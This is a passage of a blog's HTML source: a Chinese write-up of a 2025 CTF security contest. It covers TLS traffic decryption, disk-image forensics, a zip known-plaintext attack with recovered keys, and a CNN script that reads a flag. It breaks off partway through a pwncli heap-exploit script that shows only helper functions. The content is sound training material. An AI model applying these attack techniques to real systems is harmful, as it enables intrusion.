@@ -1,0 +1,851 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    
+    <meta property="og:site_name" content="#3">
+    <meta property="og:type" content="article">
+
+    
+    <meta property="og:image" content="img/cover.jpg">
+    <meta property="twitter:image" content="img/cover.jpg" />
+    
+
+    
+    <meta name="title" content="2025软创安全赛东北分区赛WP" />
+    <meta property="og:title" content="2025软创安全赛东北分区赛WP" />
+    <meta property="twitter:title" content="2025软创安全赛东北分区赛WP" />
+    
+
+    
+    <meta name="description" content="Zephyr&#39;s blog">
+    <meta property="og:description" content="Zephyr&#39;s blog" />
+    <meta property="twitter:description" content="Zephyr&#39;s blog" />
+    
+
+    
+    <meta property="twitter:card" content="summary" />
+    
+    
+
+    <meta name="keyword"  content="Zephyr, Zephyr, Zephyr, , Zephyr的网络日志, Zephyr的博客, Zephyr Blog, 博客, 个人网站, 互联网, Web, CTF,">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>2025软创安全赛东北分区赛WP | Zephyr的博客 | Zephyr Blog | Zephyr#3 | #3 |</title>
+
+    <link rel="canonical" href="/software2025/">
+
+    
+    
+    
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    
+    <link rel="stylesheet" href="/css/hugo-theme-cleanwhite.min.css">
+
+    
+    <link rel="stylesheet" href="/css/zanshang.css">
+
+    
+    <link rel="stylesheet" href="/css/font-awesome.all.min.css">
+
+    
+    
+
+    
+    <script src="/js/jquery.min.js"></script>
+
+    
+    <script src="/js/bootstrap.min.js"></script>
+
+    
+    <script src="/js/hux-blog.min.js"></script>
+
+    
+    <script src="/js/lazysizes.min.js"></script>
+
+    
+    
+ 
+ <script>
+    MathJax = {
+      tex: {
+        inlineMath: [
+          ["$", "$"],
+          ["\\(", "\\)"],
+        ],
+        displayMath: [
+          ["$$", "$$"],
+          ["\\[", "\\]"],
+        ],
+        processEscapes: true,
+        processEnvironments: true,
+      },
+      options: {
+        skipHtmlTags: ["script", "noscript", "style", "textarea", "pre"],
+      },
+    };
+  
+    window.addEventListener("load", (event) => {
+      document.querySelectorAll("mjx-container").forEach(function (x) {
+        x.parentElement.classList += "has-jax";
+      });
+    });
+  </script>
+  <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+  <script
+    type="text/javascript"
+    id="MathJax-script"
+    async
+    src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"
+  ></script>
+</head>
+<style>
+    code.has-jax {
+      -webkit-font-smoothing: antialiased;
+      background: inherit !important;
+      border: none !important;
+      font-size: 100%;
+    }
+    </style>
+
+
+
+
+
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+
+    <div class="container-fluid">
+        
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">#3</a>
+        </div>
+
+        
+        
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">All Posts</a>
+                    </li>
+                    
+                        
+                        <li>
+                            <a href="/categories/life/">life</a>
+                        </li>
+                        
+                        <li>
+                            <a href="/categories/tech/">tech</a>
+                        </li>
+                        
+                    
+                    
+		    
+                        <li><a href="/about//">ABOUT</a></li>
+                    
+                        <li><a href="/life//">LIFE</a></li>
+                    
+                        <li><a href="/course//">HISTORY</a></li>
+                    
+		            <li>
+                        <a href="/search"><i class="fa fa-search"></i></a>
+		           </li>
+                </ul>
+            </div>
+        </div>
+        
+    </div>
+    
+</nav>
+<script>
+    
+    
+    
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        
+            $navbar.className = " ";
+            
+            setTimeout(function(){
+                
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+
+
+
+<style type="text/css">
+    header.intro-header {
+        background-image: url('/img/cover.jpg')
+    }
+</style>
+
+<header class="intro-header" >
+
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <div class="tags">
+                        
+                        <a class="tag" href="/tags/ctf" title="CTF">
+                            CTF
+                        </a>
+                        
+                        <a class="tag" href="/tags/notebook" title="Notebook">
+                            Notebook
+                        </a>
+                        
+                        <a class="tag" href="/tags/writeup" title="WriteUp">
+                            WriteUp
+                        </a>
+                        
+                    </div>
+                    <h1>2025软创安全赛东北分区赛WP</h1>
+                    <h2 class="subheading">完全是抽象的比赛，平台卡的一塌糊涂。我直到比赛开赛1小时后才成功访问靶场。。</h2>
+                    <span class="meta">
+                        
+                            Posted by 
+                            
+                                Zephyr
+                             
+                            on 
+                            Saturday, March 1, 2025
+                            
+                            
+                            
+                            
+                    </span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+
+
+
+<article>
+    <div class="container">
+        <div class="row">
+
+            
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+                
+                <h1 id="misc">MISC</h1>
+<h2 id="流量--赛后解出">流量 | 赛后解出</h2>
+<p>sb了，原先没用wireshark解密过tls文件。</p>
+<p>首先追踪中间的tcp流，可以看到这一条消息</p>
+<p>
+  <img src="image.png" alt="alt text">
+
+</p>
+<p>然后按照这种格式写到一个文件里</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>CLIENT_HANDSHAKE_TRAFFIC_SECRET &lt;client_random&gt; &lt;secret&gt;
+</span></span><span style="display:flex;"><span>SERVER_HANDSHAKE_TRAFFIC_SECRET &lt;client_random&gt; &lt;secret&gt;
+</span></span><span style="display:flex;"><span>CLIENT_TRAFFIC_SECRET_0 &lt;client_random&gt; &lt;secret&gt;
+</span></span><span style="display:flex;"><span>SERVER_TRAFFIC_SECRET_0 &lt;client_random&gt; &lt;secret&gt;
+</span></span><span style="display:flex;"><span>EXPORTER_SECRET &lt;client_random&gt; &lt;secret&gt;
+</span></span></code></pre></div><p>
+  <img src="image-1.png" alt="alt text">
+
+</p>
+<p>然后</p>
+<p>在 <code>编辑-&gt;首选项-&gt;protocols</code> 中选择 tls 加载这个文件</p>
+<p>
+  <img src="image-2.png" alt="alt text">
+
+</p>
+<p>然后重启wireshark打开流量包，可以看到一个png文件，提出来</p>
+<p>
+  <img src="image-3.png" alt="alt text">
+
+</p>
+<p>幽默完了，其实早就导出来了。。但是因为写的格式有问题/wireshark重启之后大眼漏神没看到导致错过了。。。可以被开除MISC手籍了</p>
+<h2 id="取证一--赛后解出">取证一 | 赛后解出</h2>
+<p>先把第一个<code>AD1</code>文件用<code>FTK_Image</code>软件导出(sb出题人，用这个出纯恶心人)</p>
+<blockquote>
+<p>值得注意的是，当用<code>FTK</code>导出的时候，选一个文件就行，但是如果用file，不同文件还是有差别的。。</p>
+</blockquote>
+<p>然后找<code>system32</code>下的Certlog目录，打开数据库文件，选倒数第二个表，有一个<code>MyTmp</code> 然后第二个表有序列号，挨个试出来的（这道题到底不知道为什么，当时在日志中看到了<code>GoodTemplate</code>且日志报警了，于是就一直试这个。。）</p>
+<h2 id="取证二">取证二</h2>
+<p>用FTK挂载AD1镜像，然后导出文件到本地磁盘，进取证大师。</p>
+<p>进windows日志，搜木马，然后找到如下的内容</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#bd93f9">1</span>	警告	<span style="color:#bd93f9">72</span>	<span style="color:#bd93f9">2024</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">12</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">04</span> <span style="color:#bd93f9">00</span>:<span style="color:#bd93f9">04</span>:<span style="color:#bd93f9">04</span>	Microsoft<span style="color:#ff79c6">-</span>Windows<span style="color:#ff79c6">-</span>Windows Defender	<span style="color:#bd93f9">0</span>	<span style="color:#bd93f9">1116</span>	SYSTEM	DC<span style="color:#ff79c6">.</span>hack<span style="color:#ff79c6">.</span>com	<span style="color:#ff79c6">%%</span><span style="color:#bd93f9">827</span>, <span style="color:#bd93f9">4.18.1807.18075</span>, {<span style="color:#bd93f9">1107620</span>A<span style="color:#ff79c6">-</span>CDF5<span style="color:#ff79c6">-</span><span style="color:#bd93f9">4897</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">884</span>E<span style="color:#ff79c6">-</span>AFEFF0466A33}, <span style="color:#bd93f9">2024</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">12</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">03</span>T16:<span style="color:#bd93f9">04</span>:<span style="color:#bd93f9">04.460</span>Z, , , <span style="color:#bd93f9">2147890808</span>, Trojan:Win64<span style="color:#ff79c6">/</span>Meterpreter!pz, <span style="color:#bd93f9">5</span>, 严重, <span style="color:#bd93f9">8</span>, 特洛伊木马, https:<span style="color:#ff79c6">//</span>go<span style="color:#ff79c6">.</span>microsoft<span style="color:#ff79c6">.</span>com<span style="color:#ff79c6">/</span>fwlink<span style="color:#ff79c6">/</span>?linkid<span style="color:#ff79c6">=</span><span style="color:#bd93f9">37020</span><span style="color:#ff79c6">&amp;</span>name<span style="color:#ff79c6">=</span>Trojan:Win64<span style="color:#ff79c6">/</span>Meterpreter!pz<span style="color:#ff79c6">&amp;</span>threatid<span style="color:#ff79c6">=</span><span style="color:#bd93f9">2147890.</span><span style="color:#ff79c6">..</span>		正常
+</span></span></code></pre></div><p>然后打开对应的windows日志<code>Microsoft-Windows-Windows Defender%4Operational.evtx</code></p>
+<p>
+  <img src="image-4.png" alt="alt text">
+
+</p>
+<h2 id="ez_sight--_--pmczx">ez_sight | ❥(^_-) pmczx</h2>
+<p>压缩包有密码
+明文攻击，明文（ 公告.txt ）的压缩算法选store
+密钥 <code>[ ffe9e9e9 d65f814a f3c468c9 ]</code>
+根据说明建构模型</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">class</span> <span style="color:#50fa7b">SimpleCNN</span>(nn<span style="color:#ff79c6">.</span>Module):
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">def</span> __init__(self):
+</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">super</span>(SimpleCNN, self)<span style="color:#ff79c6">.</span>__init__()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        self<span style="color:#ff79c6">.</span>conv1 <span style="color:#ff79c6">=</span> nn<span style="color:#ff79c6">.</span>Conv2d(<span style="color:#bd93f9">1</span>, <span style="color:#bd93f9">32</span>, kernel_size<span style="color:#ff79c6">=</span>(<span style="color:#bd93f9">3</span>, <span style="color:#bd93f9">3</span>), stride<span style="color:#ff79c6">=</span>(<span style="color:#bd93f9">1</span>, <span style="color:#bd93f9">1</span>), padding<span style="color:#ff79c6">=</span>(<span style="color:#bd93f9">1</span>, <span style="color:#bd93f9">1</span>))
+</span></span><span style="display:flex;"><span>        self<span style="color:#ff79c6">.</span>pool <span style="color:#ff79c6">=</span> nn<span style="color:#ff79c6">.</span>MaxPool2d(kernel_size<span style="color:#ff79c6">=</span><span style="color:#bd93f9">2</span>, stride<span style="color:#ff79c6">=</span><span style="color:#bd93f9">2</span>, padding<span style="color:#ff79c6">=</span><span style="color:#bd93f9">0</span>, dilation<span style="color:#ff79c6">=</span><span style="color:#bd93f9">1</span>, ceil_mode<span style="color:#ff79c6">=</span><span style="color:#ff79c6">False</span>)
+</span></span><span style="display:flex;"><span>        self<span style="color:#ff79c6">.</span>conv2 <span style="color:#ff79c6">=</span> nn<span style="color:#ff79c6">.</span>Conv2d(<span style="color:#bd93f9">32</span>, <span style="color:#bd93f9">64</span>, kernel_size<span style="color:#ff79c6">=</span>(<span style="color:#bd93f9">3</span>, <span style="color:#bd93f9">3</span>), stride<span style="color:#ff79c6">=</span>(<span style="color:#bd93f9">1</span>, <span style="color:#bd93f9">1</span>), padding<span style="color:#ff79c6">=</span>(<span style="color:#bd93f9">1</span>, <span style="color:#bd93f9">1</span>))
+</span></span><span style="display:flex;"><span>        self<span style="color:#ff79c6">.</span>fc1 <span style="color:#ff79c6">=</span> nn<span style="color:#ff79c6">.</span>Linear(in_features<span style="color:#ff79c6">=</span><span style="color:#bd93f9">3136</span>, out_features<span style="color:#ff79c6">=</span><span style="color:#bd93f9">128</span>, bias<span style="color:#ff79c6">=</span><span style="color:#ff79c6">True</span>)
+</span></span><span style="display:flex;"><span>        self<span style="color:#ff79c6">.</span>fc2 <span style="color:#ff79c6">=</span> nn<span style="color:#ff79c6">.</span>Linear(in_features<span style="color:#ff79c6">=</span><span style="color:#bd93f9">128</span>, out_features<span style="color:#ff79c6">=</span><span style="color:#bd93f9">10</span>, bias<span style="color:#ff79c6">=</span><span style="color:#ff79c6">True</span>)
+</span></span><span style="display:flex;"><span>        self<span style="color:#ff79c6">.</span>actf <span style="color:#ff79c6">=</span> nn<span style="color:#ff79c6">.</span>ReLU()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">forward</span>(self, x):
+</span></span><span style="display:flex;"><span>        x <span style="color:#ff79c6">=</span> self<span style="color:#ff79c6">.</span>conv1(x)
+</span></span><span style="display:flex;"><span>        x <span style="color:#ff79c6">=</span> nn<span style="color:#ff79c6">.</span>ReLU()(x)
+</span></span><span style="display:flex;"><span>        x <span style="color:#ff79c6">=</span> self<span style="color:#ff79c6">.</span>pool(x)
+</span></span><span style="display:flex;"><span>        x <span style="color:#ff79c6">=</span> self<span style="color:#ff79c6">.</span>conv2(x)
+</span></span><span style="display:flex;"><span>        x <span style="color:#ff79c6">=</span> nn<span style="color:#ff79c6">.</span>ReLU()(x)
+</span></span><span style="display:flex;"><span>        x <span style="color:#ff79c6">=</span> self<span style="color:#ff79c6">.</span>pool(x)
+</span></span><span style="display:flex;"><span>        x <span style="color:#ff79c6">=</span> x<span style="color:#ff79c6">.</span>view(<span style="color:#bd93f9">3136</span>)
+</span></span><span style="display:flex;"><span>        x <span style="color:#ff79c6">=</span> self<span style="color:#ff79c6">.</span>fc1(x)
+</span></span><span style="display:flex;"><span>        x <span style="color:#ff79c6">=</span> nn<span style="color:#ff79c6">.</span>ReLU()(x)
+</span></span><span style="display:flex;"><span>        x <span style="color:#ff79c6">=</span> self<span style="color:#ff79c6">.</span>fc2(x)
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> x
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">import</span> torch
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> pickle
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> torch.nn <span style="color:#ff79c6">as</span> nn
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> numpy <span style="color:#ff79c6">as</span> np
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">from</span> PIL <span style="color:#ff79c6">import</span> Image
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">class</span> <span style="color:#50fa7b">SimpleCNN</span>(nn<span style="color:#ff79c6">.</span>Module):
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">def</span> __init__(self):
+</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">super</span>(SimpleCNN, self)<span style="color:#ff79c6">.</span>__init__()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        self<span style="color:#ff79c6">.</span>conv1 <span style="color:#ff79c6">=</span> nn<span style="color:#ff79c6">.</span>Conv2d(<span style="color:#bd93f9">1</span>, <span style="color:#bd93f9">32</span>, kernel_size<span style="color:#ff79c6">=</span>(<span style="color:#bd93f9">3</span>, <span style="color:#bd93f9">3</span>), stride<span style="color:#ff79c6">=</span>(<span style="color:#bd93f9">1</span>, <span style="color:#bd93f9">1</span>), padding<span style="color:#ff79c6">=</span>(<span style="color:#bd93f9">1</span>, <span style="color:#bd93f9">1</span>))
+</span></span><span style="display:flex;"><span>        self<span style="color:#ff79c6">.</span>pool <span style="color:#ff79c6">=</span> nn<span style="color:#ff79c6">.</span>MaxPool2d(kernel_size<span style="color:#ff79c6">=</span><span style="color:#bd93f9">2</span>, stride<span style="color:#ff79c6">=</span><span style="color:#bd93f9">2</span>, padding<span style="color:#ff79c6">=</span><span style="color:#bd93f9">0</span>, dilation<span style="color:#ff79c6">=</span><span style="color:#bd93f9">1</span>, ceil_mode<span style="color:#ff79c6">=</span><span style="color:#ff79c6">False</span>)
+</span></span><span style="display:flex;"><span>        self<span style="color:#ff79c6">.</span>conv2 <span style="color:#ff79c6">=</span> nn<span style="color:#ff79c6">.</span>Conv2d(<span style="color:#bd93f9">32</span>, <span style="color:#bd93f9">64</span>, kernel_size<span style="color:#ff79c6">=</span>(<span style="color:#bd93f9">3</span>, <span style="color:#bd93f9">3</span>), stride<span style="color:#ff79c6">=</span>(<span style="color:#bd93f9">1</span>, <span style="color:#bd93f9">1</span>), padding<span style="color:#ff79c6">=</span>(<span style="color:#bd93f9">1</span>, <span style="color:#bd93f9">1</span>))
+</span></span><span style="display:flex;"><span>        self<span style="color:#ff79c6">.</span>fc1 <span style="color:#ff79c6">=</span> nn<span style="color:#ff79c6">.</span>Linear(in_features<span style="color:#ff79c6">=</span><span style="color:#bd93f9">3136</span>, out_features<span style="color:#ff79c6">=</span><span style="color:#bd93f9">128</span>, bias<span style="color:#ff79c6">=</span><span style="color:#ff79c6">True</span>)
+</span></span><span style="display:flex;"><span>        self<span style="color:#ff79c6">.</span>fc2 <span style="color:#ff79c6">=</span> nn<span style="color:#ff79c6">.</span>Linear(in_features<span style="color:#ff79c6">=</span><span style="color:#bd93f9">128</span>, out_features<span style="color:#ff79c6">=</span><span style="color:#bd93f9">10</span>, bias<span style="color:#ff79c6">=</span><span style="color:#ff79c6">True</span>)
+</span></span><span style="display:flex;"><span>        self<span style="color:#ff79c6">.</span>actf <span style="color:#ff79c6">=</span> nn<span style="color:#ff79c6">.</span>ReLU()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">forward</span>(self, x):
+</span></span><span style="display:flex;"><span>        x <span style="color:#ff79c6">=</span> self<span style="color:#ff79c6">.</span>conv1(x)
+</span></span><span style="display:flex;"><span>        x <span style="color:#ff79c6">=</span> nn<span style="color:#ff79c6">.</span>ReLU()(x)
+</span></span><span style="display:flex;"><span>        x <span style="color:#ff79c6">=</span> self<span style="color:#ff79c6">.</span>pool(x)
+</span></span><span style="display:flex;"><span>        x <span style="color:#ff79c6">=</span> self<span style="color:#ff79c6">.</span>conv2(x)
+</span></span><span style="display:flex;"><span>        x <span style="color:#ff79c6">=</span> nn<span style="color:#ff79c6">.</span>ReLU()(x)
+</span></span><span style="display:flex;"><span>        x <span style="color:#ff79c6">=</span> self<span style="color:#ff79c6">.</span>pool(x)
+</span></span><span style="display:flex;"><span>        x <span style="color:#ff79c6">=</span> x<span style="color:#ff79c6">.</span>view(<span style="color:#bd93f9">3136</span>)
+</span></span><span style="display:flex;"><span>        x <span style="color:#ff79c6">=</span> self<span style="color:#ff79c6">.</span>fc1(x)
+</span></span><span style="display:flex;"><span>        x <span style="color:#ff79c6">=</span> nn<span style="color:#ff79c6">.</span>ReLU()(x)
+</span></span><span style="display:flex;"><span>        x <span style="color:#ff79c6">=</span> self<span style="color:#ff79c6">.</span>fc2(x)
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> x
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>model <span style="color:#ff79c6">=</span> torch<span style="color:#ff79c6">.</span>load(<span style="color:#f1fa8c">&#39;password.pt&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">check</span>(model, img):
+</span></span><span style="display:flex;"><span>    inp <span style="color:#ff79c6">=</span> np<span style="color:#ff79c6">.</span>array(img)
+</span></span><span style="display:flex;"><span>    outputs <span style="color:#ff79c6">=</span> torch<span style="color:#ff79c6">.</span>tensor(inp, dtype<span style="color:#ff79c6">=</span>torch<span style="color:#ff79c6">.</span>float32)<span style="color:#ff79c6">.</span>unsqueeze(<span style="color:#bd93f9">0</span>) <span style="color:#6272a4"># 不用/255?</span>
+</span></span><span style="display:flex;"><span>    pred <span style="color:#ff79c6">=</span> model(outputs)
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">#print(pred)</span>
+</span></span><span style="display:flex;"><span>    pred_idx <span style="color:#ff79c6">=</span> torch<span style="color:#ff79c6">.</span>argmax(pred, dim<span style="color:#ff79c6">=</span><span style="color:#bd93f9">0</span>)<span style="color:#ff79c6">.</span>item()
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> pred_idx
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>result <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">14</span>):
+</span></span><span style="display:flex;"><span>    image <span style="color:#ff79c6">=</span> Image<span style="color:#ff79c6">.</span>open(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#39;flag/</span><span style="color:#f1fa8c">{</span>i<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">.bmp&#39;</span>)<span style="color:#ff79c6">.</span>convert(<span style="color:#f1fa8c">&#39;L&#39;</span>)
+</span></span><span style="display:flex;"><span>    result <span style="color:#ff79c6">+=</span> <span style="color:#8be9fd;font-style:italic">str</span>(check(model, image))
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span>(result)      
+</span></span></code></pre></div><p><code>81294687889085</code></p>
+<p><code>dart{2855dc9b-b8c2-3c82-86d9-6afa9111b715}</code></p>
+<h1 id="pwn--hkbin">Pwn | Hkbin</h1>
+<p>整型溢出/UAF，漏洞很多</p>
+<p>
+  <img src="image-5.png" alt="alt text">
+
+</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#6272a4">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># Use pwncli</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># Date: 2025-03-23 08:39:55</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># Editor: hkbin</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># Usage:</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4">#     Debug : python3 exp.py debug elf-file-path -t -b malloc -b \$rebase\(0x3000\)</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4">#     Remote: python3 exp.py remote elf-file-path ip:port</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">from</span> pwncli <span style="color:#ff79c6">import</span> <span style="color:#ff79c6">*</span>
+</span></span><span style="display:flex;"><span>cli_script()
+</span></span><span style="display:flex;"><span>set_remote_libc(<span style="color:#f1fa8c">&#39;libc-2.31.so&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>context<span style="color:#ff79c6">.</span>arch<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;amd64&#34;</span>
+</span></span><span style="display:flex;"><span>file_path <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;/home/hkbin/Workspace/competition/2025RCQYS/pwn/encoder/pwn&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io: tube <span style="color:#ff79c6">=</span> gift<span style="color:#ff79c6">.</span>io
+</span></span><span style="display:flex;"><span>elf: ELF <span style="color:#ff79c6">=</span> gift<span style="color:#ff79c6">.</span>elf
+</span></span><span style="display:flex;"><span>libc: ELF <span style="color:#ff79c6">=</span> gift<span style="color:#ff79c6">.</span>libc
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">cmd</span>(i, prompt<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;&gt;&gt;&#39;</span>):
+</span></span><span style="display:flex;"><span>    sla(prompt, i)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">upload</span>(idx, size, payload):
+</span></span><span style="display:flex;"><span>    cmd(<span style="color:#f1fa8c">&#39;1&#39;</span>)
+</span></span><span style="display:flex;"><span>    sla(<span style="color:#f1fa8c">&#34;FileIdx: &#34;</span>, <span style="color:#8be9fd;font-style:italic">str</span>(idx))
+</span></span><span style="display:flex;"><span>    sla(<span style="color:#f1fa8c">&#34;FileSize: &#34;</span>, <span style="color:#8be9fd;font-style:italic">str</span>(size))
+</span></span><span style="display:flex;"><span>    sa(<span style="color:#f1fa8c">&#34;FileData: &#34;</span>, payload)
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">#......</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">download</span>(idx):
+</span></span><span style="display:flex;"><span>    cmd(<span style="color:#f1fa8c">&#39;2&#39;</span>)
+</span></span><span style="display:flex;"><span>    sla(<span style="color:#f1fa8c">&#34;FileIdx: &#34;</span>, <span style="color:#8be9fd;font-style:italic">str</span>(idx))
+</span></span><span style="display:flex;"><span>    ru(<span style="color:#f1fa8c">&#34;FileData: &#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">#......</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">encode</span>(idx):
+</span></span><span style="display:flex;"><span>    cmd(<span style="color:#f1fa8c">&#39;3&#39;</span>)
+</span></span><span style="display:flex;"><span>    sla(<span style="color:#f1fa8c">&#34;FileIdx: &#34;</span>, <span style="color:#8be9fd;font-style:italic">str</span>(idx))
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">#......</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">decode</span>(idx):
+</span></span><span style="display:flex;"><span>    cmd(<span style="color:#f1fa8c">&#39;4&#39;</span>)
+</span></span><span style="display:flex;"><span>    sla(<span style="color:#f1fa8c">&#34;FileIdx: &#34;</span>, <span style="color:#8be9fd;font-style:italic">str</span>(idx))
+</span></span><span style="display:flex;"><span>    <span style="color:#6272a4">#......</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">release</span>(idx):
+</span></span><span style="display:flex;"><span>    cmd(<span style="color:#f1fa8c">&#39;5&#39;</span>)
+</span></span><span style="display:flex;"><span>    sla(<span style="color:#f1fa8c">&#34;FileIdx: &#34;</span>, <span style="color:#8be9fd;font-style:italic">str</span>(idx))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># one_gadgets: list = get_current_one_gadget_from_libc(more=False)</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># one_gadgets: one_gadget_binary(binary_path, more)</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># CurrentGadgets.set_find_area(find_in_elf=True, find_in_libc=False, do_initial=False)</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># Shellcode：ShellcodeMall.amd64</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># tcache safelinking: protect_ptr(address, next)</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># tcache safelinking_de: reveal_ptr(data)</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># recvlibc: recv_current_libc_addr(offset(int), timeout(int))</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># set_libcbase: set_current_libc_base_and_log(addr(int), offset(str or int))</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># set_elfbase: set_current_code_base_and_log(addr, offset)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># burp:</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># for i in range(0x10):</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4">#     try:</span>
